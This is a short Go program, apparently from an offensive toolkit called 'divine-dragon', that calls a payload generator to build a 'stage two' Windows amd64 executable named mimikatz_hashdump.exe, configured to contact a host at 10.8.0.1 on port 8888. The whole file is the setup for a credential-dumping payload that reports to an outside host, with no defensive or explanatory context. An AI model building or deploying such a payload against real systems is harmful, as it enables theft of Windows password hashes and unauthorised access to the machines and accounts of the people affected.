package main

import "divine-dragon/payload_generator"

func main() {
	stpgm := payload_generator.NewStageTwoPayloadGeneratorModule("10.8.0.1", "8888", "mimikatz_hashdump", "windows", "amd64", "mimikatz_hashdump.exe")
	stpgm.Run()
}
